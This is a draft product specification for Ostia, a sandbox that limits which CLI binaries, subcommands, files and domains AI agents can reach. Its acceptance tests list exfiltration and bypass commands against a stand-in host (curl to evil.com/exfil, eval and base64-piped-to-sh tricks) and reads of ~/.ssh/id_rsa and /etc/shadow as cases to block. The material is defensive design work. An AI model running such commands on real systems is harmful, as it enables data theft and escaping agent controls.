# Ostia — Product Specification

**Date:** 2026-03-23
**Status:** Draft — pending review

## Problem Statement

AI agents execute CLI commands with the same ambient authority as their host user. There is no mechanism to restrict an agent to only the commands it needs, and string-level pattern matching is trivially bypassed via shell tricks, encoding, symlinks, and subshells. Agents need OS-enforced command whitelisting with per-agent profiles, auth awareness, and a clean developer experience — shipped as one zero-dependency package.

This is the Confused Deputy problem (OWASP ASI03) applied to agent CLI tooling. Every major agent framework (Claude Code, Codex, Cursor, Gemini CLI) gives agents raw bash with no per-binary scoping.

## Goals

1. **OS-level CLI gating** — agents can only execute binaries explicitly whitelisted in their profile, enforced via Linux mount namespace isolation (binaries not in the whitelist don't exist in the agent's filesystem view)
2. **Filesystem isolation** — configurable read/write path restrictions enforced at OS level via mount namespace construction and Landlock, deny-by-default
3. **Network isolation** — domain allowlist/denylist enforced via network namespace plus a built-in HTTP/SOCKS proxy, deny-by-default
4. **Subcommand-level gating** — restrict agents to specific subcommands of whitelisted binaries (e.g., `gh pr list` allowed, `gh pr merge` blocked) via pattern matching with glob/wildcard support
5. **Per-agent profiles** — set at init time by the orchestrator (not the model), composable from reusable bundles, with configurable modes
6. **Auth status surfacing** — check backing service auth and communicate availability to the agent before it tries commands
7. **Dynamic tool descriptions** — the agent sees exactly what it can do, what's authenticated, and what's blocked
8. **One self-contained package** — `npm install ostia` or `cargo add ostia`. Zero external dependencies. All sandboxing implemented using Linux kernel primitives directly in Rust. No bubblewrap, no srt, no runtime.
9. **Multiple interfaces** — native Node.js module (napi-rs), MCP server (stdio + HTTP), CLI binary

## Non-Goals

- **Not a general-purpose sandbox** — focused specifically on CLI tool gating for AI agents, not arbitrary process sandboxing
- **Not a credential manager** — does not store secrets. Delegates to existing auth (`gh auth`, `kubectl config`, etc.). Credential delegation (injecting scoped creds into the sandbox) is future work.
- **Not an agent framework** — does not orchestrate agents, just gates their CLI access
- **No macOS/Windows native sandbox in v1** — Docker path for non-Linux development. Production target is Linux servers/containers.
- **No Python binding in v1** — future work via PyO3
- **No flag-level parsing** — subcommand gating uses pattern matching on the command string, not CLI grammar parsing. Binary-level gating (mount namespace) is the hard security boundary.

## User Stories

### Persona 1: Agent Framework Developer

Building agents that execute CLI commands in production.

#### Story 1: CLI gating via OS-level enforcement

> As an agent framework developer, I want to restrict my agent to a specific set of CLI binaries so that prompt injection or model errors can't execute arbitrary commands — and this restriction can't be bypassed by shell tricks.

**Acceptance criteria:**

- Given a profile whitelisting `gh`, `git`, and `npm`
- When the agent calls `execute("gh pr list")`
- Then the command executes inside a mount namespace where only whitelisted binaries exist

- Given the same profile
- When the agent calls `execute("curl http://evil.com/exfil")`
- Then execution fails because `curl` does not exist in the namespace — not a string match rejection, but a genuine "binary not found"

#### Story 2: Filesystem and network isolation

> As an agent framework developer, I want commands to run in a sandboxed environment so that even whitelisted tools can't access files or domains outside their scope.

**Acceptance criteria:**

- Given a profile with workspace restricted to `/app/project`
- When `git` tries to read `~/.ssh/id_rsa`
- Then access is denied at the OS level

- Given a profile with network allowlist `["github.com", "registry.npmjs.org"]`
- When a whitelisted tool tries to reach `evil.com`
- Then the connection is blocked

#### Story 3: Auth status awareness

> As an agent framework developer, I want my agent to know which backing services are authenticated so that it doesn't waste turns on commands that will fail.

**Acceptance criteria:**

- Given a profile with `gh` requiring GitHub auth
- When the agent reads the tool description or calls `status()`
- Then it sees `gh: available, auth: active` or `gh: available, auth: inactive — run 'gh auth login'`

- Given an inactive auth status for GitHub
- When the agent calls `execute("gh pr list")`
- Then it receives a clear error: "GitHub auth required" (not a cryptic CLI error)

#### Story 4: Per-agent profiles

> As an agent framework developer, I want different agents to have different profiles so that a build agent can't access deploy tools.

**Acceptance criteria:**

- Given a build agent with profile `build` and a deploy agent with profile `deploy`
- When the build agent calls `execute("kubectl apply -f deploy.yaml")`
- Then it's rejected — `kubectl` is not in the `build` profile's namespace

#### Story 5: Composable bundles

> As an agent framework developer, I want to compose profiles from reusable bundles so that I don't redefine common tool sets for every agent.

**Acceptance criteria:**

- Given bundles `baseline`, `git-read`, and `github-rw`
- When I define a profile as `bundles: [baseline, git-read, github-rw]`
- Then the profile includes all tools from all three bundles
- And I can add or deny individual tools on top

#### Story 6: Subcommand-level gating

> As an agent framework developer, I want to restrict an agent to specific subcommands of a whitelisted binary so that a planning agent can read from GitHub but not push, merge, or delete.

**Acceptance criteria:**

- Given a profile allowing `gh pr list *` and `gh pr view *` but not `gh pr merge`
- When the agent calls `execute("gh pr list --repo foo/bar")`
- Then it executes successfully

- Given the same profile
- When the agent calls `execute("gh pr merge 42")`
- Then it's rejected before execution with a clear message: "subcommand 'gh pr merge' is not allowed in this profile"

- Given the same profile
- When the agent calls `execute("gh pr list && gh pr merge 42")`
- Then it's rejected — compound commands are parsed and each subcommand is validated independently

### Persona 2: Platform/DevOps Engineer

Deploying agents on shared infrastructure.

#### Story 7: MCP server mode

> As a platform engineer, I want to run ostia as an MCP server (stdio or HTTP) so that I can add it to any agent setup without code changes.

**Acceptance criteria:**

- Given `ostia serve --profile build-agent --transport stdio`
- When an MCP client connects and calls the `execute` tool
- Then it behaves identically to the library API

- Given `ostia serve --profile build-agent --transport http --port 8080`
- When agents connect over HTTP
- Then each gets the same profile enforcement

#### Story 8: Baseline tools ship with the package

> As a developer, I want common read-only tools available by default so that I don't have to whitelist basic exploration commands.

**Acceptance criteria:**

- Given a profile that includes `baseline`
- When the agent calls `execute("jq '.name' package.json")`
- Then it works without explicitly whitelisting `jq`
- And the baseline includes: `cat`, `grep`, `ls`, `find`, `head`, `tail`, `jq`, `wc`, `sed`, `awk`, `echo`, `date`, `whoami`

## Functional Requirements

1. **Binary whitelisting via mount namespace** — Ostia constructs a Linux mount namespace using kernel syscalls directly (clone/unshare). Only whitelisted binaries and their dependencies (shared libraries) are bind-mounted into the agent's filesystem view. Unlisted binaries do not exist in the namespace.

2. **Subcommand pattern matching** — Profiles can whitelist at subcommand granularity using glob patterns (`gh pr list *`, `kubectl get *`). Compound commands (`&&`, `||`, `;`, pipes) are decomposed and each subcommand validated independently before execution.

3. **Filesystem isolation** — Enforced via mount namespace construction (read-only bind mounts, restricted write paths) plus Landlock as a second enforcement layer. Deny-by-default with explicit allowlists. Mandatory deny paths (`.ssh`, `.env`, `.git/hooks`, `.bashrc`, `.zshrc`) that cannot be overridden.

4. **Network isolation** — Enforced via network namespace (agent process has no network access by default) plus a built-in HTTP/SOCKS proxy that allows only whitelisted domains. Proxy runs in the host namespace, connected to the agent namespace via Unix socket relay.

5. **Profile system** — YAML config defining per-agent profiles with: whitelisted binaries, subcommand patterns, filesystem paths, network domains, auth requirements. Profiles are composable from named bundles. Profile is selected at init time by the orchestrator, locked for the session.

6. **Bundle system** — Reusable named sets of tool whitelists. Ship a standard library of bundles (`baseline`, `git-read`, `git-write`, `github-read`, `github-rw`, `k8s-read`, `docker`). Users define custom bundles. Profiles compose from multiple bundles with additive merging and per-profile overrides/denies.

7. **Auth status checking** — Each profile declares auth requirements as executable check commands (e.g., `gh auth status` returns exit code 0/1). Ostia runs these at init and exposes results. Auth status is included in tool descriptions so the agent knows what's available.

8. **Dynamic tool descriptions** — Generate a structured description of available commands and auth status. Consumable by agent frameworks as a tool description string. Updates when auth status changes.

9. **Library interface (napi-rs)** — Native Node.js module. API: `new Ostia(profilePath, profileName)`, `ostia.execute(command, options?)`, `ostia.status()`, `ostia.availableTools()`.

10. **MCP server mode** — Standalone MCP server over stdio and streamable HTTP. Exposes `execute`, `status`, and `list_tools` as MCP tools. Profile set at server start time via CLI flag.

11. **CLI binary** — `ostia serve` for MCP mode. `ostia check` for config validation and auth status. `ostia run` for one-off sandboxed command execution.

12. **Baseline bundle** — Ships with the package: `cat`, `grep`, `ls`, `find`, `head`, `tail`, `jq`, `wc`, `sed`, `awk`, `echo`, `date`, `whoami`, and similar read-oriented utilities.

## Non-Functional Requirements

1. **Overhead** — Gating layer adds <5ms per command invocation (pattern matching + namespace setup amortized). Not a bottleneck relative to LLM round-trips (1-3 seconds).

2. **Platform** — Linux-first. Requires Linux kernel 5.13+ for Landlock. Mount and network namespaces available on older kernels. macOS/Windows users run via Docker container.

3. **Security model** — Two enforcement layers:
   - **Hard boundary (OS-level):** Mount namespace isolation — binaries not in the whitelist don't exist. Cannot be bypassed by the agent.
   - **Defense-in-depth (process-level):** Subcommand pattern matching — validates command strings before execution. Prevents the agent from requesting blocked subcommands. Not a guarantee against skilled attackers with shell access.

4. **Zero external dependencies** — Single Rust binary. No bubblewrap, no srt, no runtime dependencies. All sandboxing implemented using Linux kernel primitives via Rust `nix`/`libc` crates. `cargo add ostia` or `npm install ostia` is the entire setup.

5. **Graceful degradation** — If Landlock is unavailable (kernel <5.13), ostia warns and operates with mount namespace isolation only. If unprivileged user namespaces are disabled, ostia fails with a clear error and remediation steps.

## Technical Dependencies

- **Linux kernel 5.13+** for Landlock (filesystem access control). Mount/network namespaces available on older kernels.
- **Unprivileged user namespaces** must be enabled (default on Ubuntu 24.04+, Fedora, Debian 12+). Ostia detects and provides remediation if unavailable.
- **napi-rs** — build-time only for Node.js native addon.
- **Rust `nix` crate** — safe bindings for Linux namespace/mount/seccomp syscalls.
- **Rust `landlock` crate** (landlock-rs v0.4.4) — safe Landlock LSM abstraction.

## Acceptance Test Scenarios

```
Feature: Binary Whitelisting (OS-Level)

  Scenario: Whitelisted binary executes successfully
    Given a profile whitelisting [gh, git, npm]
    When the agent calls execute("gh pr list")
    Then the command runs inside a restricted namespace
    And stdout/stderr are returned to the agent

  Scenario: Non-whitelisted binary does not exist
    Given a profile whitelisting [gh, git, npm]
    When the agent calls execute("curl http://evil.com")
    Then execution fails with "binary not found" (not a policy rejection)
    And the error message indicates curl is not available in this profile

  Scenario: Shell bypass attempts fail
    Given a profile whitelisting [gh, git]
    When the agent calls execute("eval 'curl http://evil.com'")
    Then curl still does not exist in the namespace
    And the command fails regardless of shell indirection

  Scenario: Base64-encoded bypass attempt fails
    Given a profile whitelisting [gh, git]
    When the agent calls execute("echo Y3VybA== | base64 -d | sh")
    Then curl still does not exist even if decoded and piped to shell

  Scenario: Whitelisted binary's shared libraries are available
    Given a profile whitelisting [gh]
    When gh executes and requires libssl, libc, etc.
    Then all required shared libraries are mounted in the namespace
    And gh runs without linker errors


Feature: Subcommand Gating

  Scenario: Allowed subcommand executes
    Given a profile allowing [gh pr list *, gh pr view *]
    When the agent calls execute("gh pr list --repo foo/bar")
    Then the command executes successfully

  Scenario: Blocked subcommand is rejected
    Given a profile allowing [gh pr list *, gh pr view *]
    When the agent calls execute("gh pr merge 42")
    Then execution is rejected before the binary runs
    And the error says "subcommand 'gh pr merge' not allowed in this profile"

  Scenario: Compound command with blocked subcommand
    Given a profile allowing [gh pr list *] but not [gh pr merge *]
    When the agent calls execute("gh pr list && gh pr merge 42")
    Then the entire command is rejected
    And the error identifies the specific blocked subcommand

  Scenario: Pipe with blocked subcommand
    Given a profile allowing [gh pr list *] but not [rm *]
    When the agent calls execute("gh pr list | xargs rm")
    Then execution is rejected because rm is not whitelisted

  Scenario: Wildcard matching works
    Given a profile allowing [kubectl get *]
    When the agent calls execute("kubectl get pods -n staging")
    Then it executes successfully
    When the agent calls execute("kubectl delete pod foo")
    Then it is rejected


Feature: Filesystem Isolation

  Scenario: Workspace writes are allowed
    Given a profile with write access to /app/project
    When a command writes to /app/project/output.txt
    Then the write succeeds

  Scenario: Writes outside workspace are blocked
    Given a profile with write access to /app/project
    When a command writes to /tmp/malicious.sh
    Then the write is denied at the OS level

  Scenario: Sensitive paths are always denied
    Given any profile, including one with broad read access
    When a command reads ~/.ssh/id_rsa
    Then access is denied
    And this applies to all mandatory deny paths (.ssh, .env, .git/hooks, .bashrc, .zshrc)

  Scenario: Read access is scoped
    Given a profile with read access to /app/project and /usr
    When a command reads /etc/shadow
    Then access is denied


Feature: Network Isolation

  Scenario: Allowed domain is reachable
    Given a profile with network allowlist [github.com, registry.npmjs.org]
    When a command makes an HTTPS request to github.com
    Then the request succeeds through the proxy

  Scenario: Non-allowed domain is blocked
    Given a profile with network allowlist [github.com]
    When a command makes an HTTPS request to evil.com
    Then the connection is blocked by the proxy
    And the agent sees a clear "domain not allowed" error

  Scenario: No network by default
    Given a profile with no network configuration
    When a command attempts any network request
    Then all connections fail (deny-by-default)


Feature: Auth Status

  Scenario: Auth check runs at init
    Given a profile requiring github auth (check: "gh auth status")
    When ostia initializes with this profile
    Then it runs gh auth status
    And records the result (active/inactive)

  Scenario: Auth status is surfaced in tool description
    Given github auth is active and npm auth is inactive
    When the agent reads the tool description
    Then it sees gh commands marked as available
    And npm commands marked as "auth inactive — run 'npm login'"

  Scenario: Inactive auth produces clear error on execute
    Given github auth is inactive
    When the agent calls execute("gh pr list")
    Then it receives "GitHub auth required — run 'gh auth login'"
    And the command does not execute


Feature: Profile System

  Scenario: Profile loads from YAML config
    Given a valid ostia.yaml with profile "build-agent"
    When ostia initializes with profile "build-agent"
    Then all whitelisted binaries, paths, domains are applied

  Scenario: Invalid YAML produces clear error
    Given a ostia.yaml with syntax errors
    When ostia attempts to load it
    Then it fails with a specific parse error and line number

  Scenario: Missing profile name produces clear error
    Given a ostia.yaml without a profile named "deploy"
    When ostia initializes with profile "deploy"
    Then it fails with "profile 'deploy' not found in config"

  Scenario: Bundle composition works
    Given bundles baseline, git-read, and github-rw
    And a profile composing all three with an additional deny on "gh repo delete"
    When the profile is loaded
    Then all tools from all bundles are available
    And "gh repo delete" is specifically blocked

  Scenario: Profile-level deny overrides bundle allow
    Given a bundle allowing [git push *]
    And a profile using that bundle but denying [git push *]
    When the agent calls execute("git push origin main")
    Then it is rejected (deny overrides allow)


Feature: MCP Server Mode

  Scenario: stdio transport works
    Given ostia serve --profile build --transport stdio
    When an MCP client sends a tools/list request
    Then it receives execute, status, and list_tools

  Scenario: HTTP transport works
    Given ostia serve --profile build --transport http --port 8080
    When an MCP client connects to http://localhost:8080
    Then tool calls work identically to stdio mode

  Scenario: Profile is locked for session
    Given ostia serve --profile build
    When an MCP client sends execute with a command not in the build profile
    Then it is rejected
    And there is no way to switch profiles mid-session


Feature: Graceful Degradation

  Scenario: Landlock unavailable (kernel < 5.13)
    Given a Linux kernel older than 5.13
    When ostia initializes
    Then it warns "Landlock unavailable — running with namespace isolation only"
    And mount namespace isolation still works

  Scenario: User namespaces disabled
    Given a system with unprivileged user namespaces disabled
    When ostia initializes
    Then it fails with a clear error
    And provides remediation steps for the specific distro

  Scenario: Whitelisted binary not found on host
    Given a profile whitelisting [gh] but gh is not installed
    When ostia initializes
    Then it warns "gh not found on host — will not be available"
    And the profile loads successfully with gh excluded
    And status() reflects gh as unavailable
```

## Open Questions

1. **Shared library resolution** — When a binary is whitelisted, its shared library dependencies (libc, libssl, etc.) must also be mounted. How do we resolve and mount the full dependency tree? (`ldd` output parsing? `ld.so.cache` reading?)
2. **Stateful tools** — Some tools need writable state directories (e.g., `git` needs `.git/`, `npm` needs `node_modules/`). How do we handle write paths for tool-specific state vs general workspace writes?
3. **Shell selection** — Commands need a shell to run in. Do we mount a minimal shell (`/bin/sh`) always, or let the profile configure which shell?
4. **seccomp BPF scope** — Do we use seccomp for additional syscall filtering beyond what namespaces provide? (e.g., blocking `ptrace`, restricting `socket` types)
5. **Container environments** — When ostia runs inside Docker/Kubernetes, nested namespaces may require specific security context settings (`--privileged` or `CAP_SYS_ADMIN`). What's the minimum capability set?

## Success Metrics

- A developer can `npm install ostia`, write a 20-line YAML config, and have OS-level CLI gating running in under 10 minutes
- An agent constrained by ostia cannot execute a binary not in its whitelist, regardless of prompt injection attempts
- Auth status is surfaced before the agent's first tool call
- MCP server mode works with Claude Code, Codex, and any MCP-compatible client without code changes
